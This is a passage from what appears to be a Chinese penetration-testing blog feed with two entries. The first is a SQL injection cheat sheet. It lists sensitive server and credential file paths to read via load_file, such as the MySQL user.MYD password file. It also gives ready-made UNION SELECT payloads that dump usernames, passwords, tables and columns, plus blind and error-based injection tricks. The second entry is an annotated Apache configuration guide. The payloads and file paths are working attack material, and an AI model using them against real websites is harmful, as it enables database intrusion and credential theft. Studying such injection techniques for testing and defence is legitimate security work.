文件里完全显示代码。有些时候不替换一些字符，如 “&lt;” 替换成” 空格” 返回的是网页。而无法查看到代码.</p>\n<p>3、 load_file (char (47)) 可以列出 FreeBSD,Sunos 系统根目录<br />\n 4、/etc tpd/conf tpd.conf 或 /usr/local/apche/conf tpd.conf 查看 linux APACHE 虚拟主机配置文件<br />\n 5、c:\\Program Files\\Apache Group\\Apache\\conf \\httpd.conf 或 C:\\apache\\conf \\httpd.conf 查看 WINDOWS 系统 apache 文件<br />\n 6、c:/Resin-3.0.14/conf/resin.conf 查看 jsp 开发的网站 resin 文件配置信息.<br />\n7、c:/Resin/conf/resin.conf/usr/local/resin/conf/resin.conf 查看 linux 系统配置的 JSP 虚拟主机<br />\n 8、d:\\APACHE\\Apache2\\conf\\httpd.conf<br />\n9、C:\\Program Files\\mysql\\my.ini<br />\n10、…/themes/darkblue_orange/layout.inc.php phpmyadmin 爆路径<br />\n 11、 c:\\windows\\system32\\inetsrv\\MetaBase.xml 查看 IIS 的虚拟主机配置文件<br />\n 12、 /usr/local/resin-3.0.22/conf/resin.conf 针对 3.0.22 的 RESIN 配置文件查看<br />\n 13、 /usr/local/resin-pro-3.0.22/conf/resin.conf 同上<br />\n 14 、/usr/local/app/apache2/conf/extra tpd-vhosts.conf APASHE 虚拟主机查看<br />\n 15、 /etc/sysconfig/iptables 本看防火墙策略<br />\n 16 、 usr/local/app/php5 b/php.ini PHP 的相当设置<br />\n 17 、/etc/my.cnf MYSQL 的配置文件<br />\n 18、 /etc/redhat-release 红帽子的系统版本<br />\n 19 、C:\\mysql\\data\\mysql\\user.MYD 存在 MYSQL 系统中的用户密码<br />\n 20、/etc/sysconfig/network-scripts/ifcfg-eth0 查看 IP.<br />\n21、/usr/local/app/php5 b/php.ini//PHP 相关设置<br />\n 22、/usr/local/app/apache2/conf/extra tpd-vhosts.conf// 虚拟网站设置<br />\n 23、C:\\Program Files\\<span class=\"exturl\" data-url=\"aHR0cDovL1JoaW5vU29mdC5jb20=\">RhinoSoft.com</span>\\Serv-U\\ServUDaemon.ini<br />\n24、c:\\windows\\my.ini<br />\n25、c:\\boot.ini</p>\n<h2 id=\"网站常用配置文件\"><a class=\"anchor\" href=\"#网站常用配置文件\">#</a> 网站常用配置文件</h2>\n<p>config.inc.php、config.php。</p>\n<p>load_file（）时要用 replace（load_file (HEX)，char (60),char (32)）<br />\n注：<br />\nChar (60) 表示 &lt;<br />\nChar（32）表示 空格</p>\n<h2 id=\"手工注射时出现的问题\"><a class=\"anchor\" href=\"#手工注射时出现的问题\">#</a> 手工注射时出现的问题：</h2>\n<p>当注射后页面显示：<br />\nIllegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,IMPLICIT) for operation ‘UNION’<br />\n如：/instrument.php?ID=13 and 1=2 union select 1,load_file (0x433A5C626F6F742E696E69),3,4,user ()<br />\n 这是由于前后编码不一致造成的，<br />\n解决方法：在参数前加上 unhex (hex (参数)) 就可以了。上面的 URL 就可以改为：<br />\n/instrument.php?ID=13 and 1=2 union select 1,unhex(hex(load_file(0x433A5C626F6F742E696E69))),3,4,unhex(hex(user()))</p>\n<h1 id=\"常见函数\"><a class=\"anchor\" href=\"#常见函数\">#</a> 常见函数</h1>\n<font color=\"DeepSkyBlue\">\n<h2 id=\"length\"><a class=\"anchor\" href=\"#length\">#</a> length()</h2>\n<p>MySQL LENGTH (str) 函数的返回值为字符串的字节长度，使用 uft8（UNICODE 的一种变长字符编码，又称万国码）编码字符集时，一个汉字是 3 个字节，一个数字或字母是一个字节。</p>\n<p>【实例】使用 LENGTH 函数计算字符串长度，输入的 SQL 语句和执行结果如下所示。</p>\n<pre><code>mysql&gt; SELECT LENGTH('name'),LENGTH('数据库');\n+----------------+---------------------+\n|LENGTH('name')  | LENGTH('数据库')    |\n+----------------+---------------------+\n|              4 |                   9 |\n+----------------+---------------------+\n1 row in set (0.04 sec)\n</code></pre>\n<p>由运行结果可以看到，一个汉字是 3 个字节，“数据库” 字符串占 9 个字节。英文字符的个数和所占的字节相同，一个字符占 1 个字节。</p>\n<h2 id=\"substr\"><a class=\"anchor\" href=\"#substr\">#</a> substr()</h2>\n<p>mysql substr () 函数<br />\n截取字符串</p>\n<p>用法：substr (string string,num start,num length);</p>\n<p>select  substr (参数 1，参数 2，参数 3)  from  表名<br />\n string 为字符串；start 为起始位置；length 为长度。</p>\n<p>注意：mysql 中的 start 是从 1 开始的。</p>\n<p>SUBSTR () 函数是 SUBSTRING () 函数的同义词，所以可以互换使用它们</p>\n<h2 id=\"sleep\"><a class=\"anchor\" href=\"#sleep\">#</a> sleep()</h2>\n<h2 id=\"benchmark\"><a class=\"anchor\" href=\"#benchmark\">#</a> benchmark()</h2>\n<pre><code>\nBENCHMARK(count,expr)   \nBENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。结果值总是0。意欲用于mysql客户，它报告查询的执行时间。   \nmysql&gt; select BENCHMARK(1000000,encode(&quot;hello&quot;,&quot;goodbye&quot;));   \n+----------------------------------------------+   \n| BENCHMARK(1000000,encode(&quot;hello&quot;,&quot;goodbye&quot;)) |   \n+----------------------------------------------+   \n| 0                                            |   \n+----------------------------------------------+   \n1 row in set (4.74 sec)  \n\n</code></pre>\n<h2 id=\"ifexpr1expr2expr3\"><a class=\"anchor\" href=\"#ifexpr1expr2expr3\">#</a> if(expr1,expr2,expr3)</h2>\n<p>if(length(database())&gt;5,sleep(5),1)</p>\n<h2 id=\"datadir\"><a class=\"anchor\" href=\"#datadir\">#</a> @@datadir</h2>\n<p>数据库文件所在位置</p>\n<h2 id=\"version_compile_os\"><a class=\"anchor\" href=\"#version_compile_os\">#</a> @@version_compile_os</h2>\n<p>查看当前操作系统</p>\n<h2 id=\"concat\"><a class=\"anchor\" href=\"#concat\">#</a> concat()</h2>\n<p>语法及使用特点：<br />\nCONCAT(str1,str2,…)<br />\n 返回结果为连接参数产生的字符串。如有任何一个参数为 NULL ，则返回值为 NULL。可以有一个或多个参数。</p>\n<h2 id=\"concat_ws\"><a class=\"anchor\" href=\"#concat_ws\">#</a> concat_ws()</h2>\n<p>使用函数 CONCAT_WS（）。使用语法为：CONCAT_WS (separator,str1,str2,…)<br />\n CONCAT_WS () 代表 CONCAT With Separator ，是 CONCAT () 的特殊形式。第一个参数是其它参数的分隔符。分<br />\n隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，<br />\n则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。但是 CONCAT_WS () 不会忽略任何空字符串。 (然而会<br />\n忽略所有的 NULL）。<br />\n如 SELECT CONCAT_WS ('_',id,name) AS con_ws FROM info LIMIT 1; 返回结果为</p>\n<pre><code>+----------+\n| con_ws   |\n+----------+\n| 1_BioCyc |\n+----------+\n</code></pre>\n<h2 id=\"group_concat\"><a class=\"anchor\" href=\"#group_concat\">#</a> group_concat()</h2>\n<p>区分 concat_ws () 与 group_concat () 函数<br />\n concat_ws (char (32,58,32),user (),database (),version ())<br />\n 在 concat_ws 函数中，第一个参数是用于作为分隔符将后面各个参数的内容分隔开来再进行相应的连接产生新的字符串。</p>\n<p>group_connect () 函数<br />\n完整的语法如下：<br />\ngroup_concat ([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])<br />\n 功能：将 group by 产生的同一个分组中的值连接起来，返回一个字符串结果<br />\n说明：通过使用 distinct 可以排除重复值；如果希望对结果中的值进行排序，可以使用 order by 子句；separator 是一个字符串值，缺省为一个逗号。</p>\n<p>图一，区别<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<p>报错注入<br />\n 0x7e  ASCII    ~</p>\n<p>updatexml () 是更新 xml 文档的函数</p>\n<p>语法 updatexml (目标 xml 文档，xml 路径，更新的内容)<br />\n<img data-src=\"image002.png\" alt=\"\" /></p>\n<h2 id=\"php\"><a class=\"anchor\" href=\"#php\">#</a> php</h2>\n<h3 id=\"preg_math\"><a class=\"anchor\" href=\"#preg_math\">#</a> preg_math()</h3>\n<h3 id=\"floor\"><a class=\"anchor\" href=\"#floor\">#</a> floor()</h3>\n<p>语法<br />\n floor (x)<br />\n 返回不大于 x 的下一个整数，将 x 的小数部分舍去取整。floor () 返回的类型仍然是 float，因为 float 值的范围通常比 integer 要大。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token number\">5.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">5.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">5.9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>//输出：</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>0</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>0</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>5</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>5</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>-6</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>-6</pre></td></tr></table></figure><p>html 实体编码</p>\n</font>\n<h1 id=\"sql-injection-payload\"><a class=\"anchor\" href=\"#sql-injection-payload\">#</a> SQL injection payload</h1>\n<p>用户名 密码<br />\n数字型</p>\n<p><code>?id=-1 union select 1,(select group_concat(concat_ws(&quot;--&gt;&quot;,username,password) separator '&lt;br&gt;') from users),(@@datadir)</code></p>\n<p>字段名</p>\n<p><code>?id=-1 union select 1,2,(select group_concat(column_name separator '&lt;br&gt;') from information_schema.columns where table_name='users')</code></p>\n<p>表名<br />\n <code>?id=-1 union select 1,(select group_concat(table_name separator '&lt;br&gt;') from information_schema.tables where table_schema=database()),3</code></p>\n<p>单引号括号<br />\n <code>?id=-1') union select 1,(select group_concat(concat_ws(&quot;--&gt;&quot;,username,password) separator '&lt;br&gt;') from users),3 --+</code></p>\n",
            "tags": [
                "sql注入"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/Apache-Config/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/Apache-Config/",
            "title": "Apache_Config",
            "date_published": "2020-11-30T00:42:31.000Z",
            "content_html": "<h1 id=\"一-apache主要配置文件注释\"><a class=\"anchor\" href=\"#一-apache主要配置文件注释\">#</a> 一、Apache 主要配置文件注释</h1>\n<p>Apache 的主配置文件：httpd.conf</p>\n<hr />\n<p>Apache 服务器的配置信息全部存储在主配置文件 httpd.conf 中，这个文件中的内容非常多，其中大部分是以 #开头的注释行。</p>\n<hr />\n<p>ServerTokens OS<br />\n 在出现错误页的时候是否显示服务器操作系统的名称，ServerTokens Prod 为不显示</p>\n<hr />\n<p>ServerRoot &quot;/etc/httpd&quot;<br />\n 用于指定 Apache 的运行目录，服务启动之后自动将目录改变为当前目录，在后面使用到的所有相对路径都是相对这个目录</p>\n<hr />\n<p>User daemon                          # apache 的用户，默认为 daemon<br />\nGroup daemon                         # apache 的用户，默认为 daemon</p>\n<hr />\n<p>PidFile run/httpd.pid<br />\n 记录 httpd 守护进程的 pid 号码，这是系统识别一个进程的方法，系统中 httpd 进程可以有多个，但这个 PID 对应的进程是其他的父进程</p>\n<hr />\n<p>Listen 80<br />\n 监听的端口</p>\n<hr />\n<p>Include conf.modules.d/<em>.conf<br />\n 包含辅助配置文件目录下的所有以.conf 结尾的；；；文件 (/etc/httpd/conf.modules.d/</em>.conf)</p>\n<hr />\n<p>User apache       // 运行 web 服务的用户<br />\n Group apache</p>\n<p>ServerAdmin root@localhost<br />\n 管理员邮件地址</p>\n<hr />\n<p>#ServerName <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5leGFtcGxlLmNvbTo4MA==\">www.example.com:80</span></p>\n<p>ServerName <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy51cGxvb2tpbmcuY29tOjgw\">www.uplooking.com:80</span></p>\n<p>服务器的名字</p>\n<hr />\n<p>&lt;Directory /&gt;   --- 容器，对整个目录中的东西进行设置，权限等等<br />\n AllowOverride none<br />\nRequire all denied<br />\n&lt;/Directory&gt;</p>\n<hr />\n<p>DocumentRoot &quot;/var/www/html&quot;    //web 服务文档根路径</p>\n<p>&lt;Directory &quot;/var/www&quot;&gt;<br />\nAllowOverride None<br />\n# Allow open access:<br />\nRequire all granted<br />\n&lt;/Directory&gt;</p>\n<hr />\n<p>&lt;Directory &quot;/var/www/html&quot;&gt;<br />\nOptions Indexes FollowSymLinks     //Indexes：索引目录，（默认没有主页时），允许索引目录   FollowSymLinks：支持符号链接  软连接<br />\n AllowOverride None     // 和访问权限有关  可以进行认证        None -- 不使用认证  all-- 应用所有的认证指令  AuthConfig  -- 允许使用与认证授权相关的指令<br />\n Require all granted    // 访问控制  所有人放行<br />\n &lt;/Directory&gt;</p>\n<hr />\n<p>&lt;IfModule dir_module&gt;<br />\nDirectoryIndex index.html    // 网站索引页的名称<br />\n &lt;/IfModule&gt;</p>\n<hr />\n<p>&lt;Files &quot;.ht*&quot;&gt;   <a href=\"//xn--onqt58b9od.xn--ht-0v2cr7rysinljbd734h560cpjpfa017hsnnga166c4nw\">// 以所有.ht 开头进行模式匹配不能进行访问</a><br />\n Require all denied<br />\n&lt;/Files&gt;</p>\n<hr />\n<p>ErrorLog &quot;logs/error_log&quot;    // 错误日志的设定</p>\n<hr />\n<p>LogLevel warn  // 日志级别</p>\n<hr />\n<p>&lt;IfModule log_config_module&gt;<br />\nLogFormat &quot;% h % l % u % t&quot;% r&quot;%&gt;s % b&quot;%{Referer} i&quot;&quot;%{User-Agent} i&quot;&quot; combined   // 日志格式规定<br />\n LogFormat &quot;% h % l % u % t&quot;% r&quot;%&gt;s % b&quot; common     // 日志格式规定<br />\n &lt;IfModule logio_module&gt;<br />\nLogFormat &quot;% h % l % u % t&quot;% r&quot;%&gt;s % b&quot;%{Referer} i&quot;&quot;%{User-Agent} i&quot; % I % O&quot; combinedio   // 日志格式规定<br />\n &lt;/IfModule&gt;<br />\nCustomLog &quot;logs/access_log&quot; combined  // 访问日志<br />\n &lt;/IfModule&gt;</p>\n<hr />\n<p>&lt;IfModule alias_module&gt;<br />\n# Alias /webpath /full/filesystem/path<br />\n 给路径设置别名<br />\n意味着访问 <code>http://Server_ip/webpath</code>  时，其页面文件来自于 /full/filesystem/path 中<br />\n ScriptAlias /cgi-bin/ &quot;/var/www/cgi-bin/&quot;<br />\n 脚本路径的别名</p>\n<p>&lt;/IfModule&gt;</p>\n<hr />\n<p>&lt;Directory &quot;/var/www/cgi-bin&quot;&gt;<br />\nAllowOverride None<br />\nOptions None<br />\nRequire all granted<br />\n&lt;/Directory&gt;</p>\n<hr />\n<p>&lt;IfModule mime_module&gt;<br />\nTypesConfig /etc/mime.types    // 支持哪些非二进制文件<br />\n AddType application/x-compress .Z<br />\nAddType application/x-gzip .gz .tgz<br />\nAddType text/html .shtml<br />\nAddOutputFilter INCLUDES .shtml<br />\n&lt;/IfModule&gt;</p>\n<hr />\n<p>AddDefaultCharset UTF-8   // 默认字符集</p>\n<hr />\n<p>#EnableMMAP off    // 线程模式<br />\n EnableSendfile on   // 开启进程模式 (默认)</p>\n<hr />\n<p>IncludeOptional conf.d/<em>.conf    <a href=\"//xn--ghqqurb19uen20dx50b1kfwpio3dq99cjbbf29dt43cquf.xn--conf-t85fm71eo1ob75a5vp\">// 包含辅助配置文件目录下的所有以.conf 结尾的文件</a> (/etc/httpd/conf.d/</em>.conf)</p>\n<hr />\n<h1 id=\"二-apache扩展的配置文件\"><a class=\"anchor\" href=\"#二-apache扩展的配置文件\">#</a> 二、Apache 扩展的配置文件</h1>\n<p>$APACHE_HOME/conf/extra          # apache 扩展的配置文件<br />\n [root@extra]# ll<br />\ntotal 56<br />\n-rw-r--r-- 1 root root  2859 Jan 10 01:49 httpd-autoindex.conf<br />\n-rw-r--r-- 1 root root  1753 Jan 10 01:49 httpd-dav.conf<br />\n-rw-r--r-- 1 root root  2344 Jan 10 01:49 httpd-default.conf<br />\n-rw-r--r-- 1 root root  1103 Jan 10 01:49 httpd-info.conf<br />\n-rw-r--r-- 1 root root  5078 Jan 10 01:49 httpd-languages.conf<br />\n-rw-r--r-- 1 root root   932 Jan 10 01:49 httpd-manual.conf<br />\n-rw-r--r-- 1 root root  3789 Jan 10 01:49 httpd-mpm.conf<br />\n-rw-r--r-- 1 root root  2207 Jan 10 01:49 httpd-multilang-errordoc.conf<br />\n-rw-r--r-- 1 root root 11185 Jan 10 01:49 httpd-ssl.conf<br />\n-rw-r--r-- 1 root root   817 Jan 10 01:49 httpd-userdir.conf<br />\n-rw-r--r-- 1 root root  1507 Jan 10 01:49 httpd-vhosts.conf # 虚拟主机配置文件</p>\n<hr />\n<h1 id=\"三-httpd-vhostsconf虚拟主机配置文件注释\"><a class=\"anchor\" href=\"#三-httpd-vhostsconf虚拟主机配置文件注释\">#</a> 三、httpd-vhosts.conf 虚拟主机配置文件注释</h1>\n<p>[root@extra]# egrep -v &quot;<sup>.*#|</sup>$&quot; httpd-vhosts.conf |nl<br />\n1  NameVirtualHost *:80                                # 基于名称的虚拟主机配置（ *:80 表示监听本机所有 ip）<br />\n2  &lt;VirtualHost *:80&gt;                                  # 定义一个虚拟主机<br />\n 3      ServerAdmin <span class=\"exturl\" data-url=\"bWFpbHRvOndlYm1hc3RlckBkdW1teS1ob3N0LmV4YW1wbGUuY29t\">webmaster@dummy-host.example.com</span>    # 配置管理员邮箱<br />\n 4      DocumentRoot &quot;/application/apache2.2.22/docs/dummy-host.example.com&quot;  # 程序的站点目录<br />\n 5      ServerName <span class=\"exturl\" data-url=\"aHR0cDovL2R1bW15LWhvc3QuZXhhbXBsZS5jb20=\">dummy-host.example.com</span>               # 域名服务，需要 apache mode_alias 模块支持<br />\n 6      ServerAlias <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5kdW1teS1ob3N0LmV4YW1wbGUuY29t\">www.dummy-host.example.com</span>          # 虚拟主机别名<br />\n 7      ErrorLog &quot;logs/dummy-host.example.com-error_log&quot;# 错误的日志路径<br />\n 8      CustomLog &quot;logs/dummy-host.example.com-access_log&quot; common  #访问日志配置（生产环境我们用 combined 格式代替 common 格式）<br />\n9  &lt;/VirtualHost&gt;<br />\n10  &lt;VirtualHost *:80&gt;<br />\n11      ServerAdmin <span class=\"exturl\" data-url=\"bWFpbHRvOndlYm1hc3RlckBkdW1teS1ob3N0Mi5leGFtcGxlLmNvbQ==\">webmaster@dummy-host2.example.com</span><br />\n12      DocumentRoot &quot;/application/apache2.2.22/docs/dummy-host2.example.com&quot;<br />\n13      ServerName <span class=\"exturl\" data-url=\"aHR0cDovL2R1bW15LWhvc3QyLmV4YW1wbGUuY29t\">dummy-host2.example.com</span><br />\n14      ErrorLog &quot;logs/dummy-host2.example.com-error_log&quot;<br />\n15      CustomLog &quot;logs/dummy-host2.example.com-access_log&quot; common<br />\n16  &lt;/VirtualHost&gt;</p>\n",
            "tags": [
                "Apeache"
            ]
        }
    ]
}